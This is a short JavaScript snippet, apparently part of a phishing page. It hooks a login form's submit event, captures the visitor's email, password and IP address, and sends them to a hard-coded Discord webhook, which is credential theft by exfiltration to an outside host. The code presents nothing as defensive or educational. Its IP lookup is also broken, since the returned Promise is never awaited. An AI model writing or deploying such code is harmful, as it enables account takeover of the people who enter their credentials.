document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const ip = getIPAddress(); // Function to get the user's IP address

    const data = {
        content: 'User Login Information',
        embeds: [
            {
                title: 'Login Details',
                fields: [
                    { name: 'Email', value: email, inline: true },
                    { name: 'Password', value: password, inline: true },
                    { name: 'IP Address', value: ip, inline: true }
                ],
                color: 0x4caf50
            }
        ]
    };

    fetch('https://discord.com/api/webhooks/1558964430836990175/RnRA4zY8n88DU_GAy6V4624zovlkm3Hj6rQSxOmz_Z3xLJUSjqLVa_ie-m198jW5Av02', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': JSON.stringify(data).length
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
    })
    .catch((error) => {
        console.error('Error:', error);
    });
});

// Function to get the user's IP address
function getIPAddress() {
    return new Promise(resolve => {
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => resolve(data.ip));
    });
}
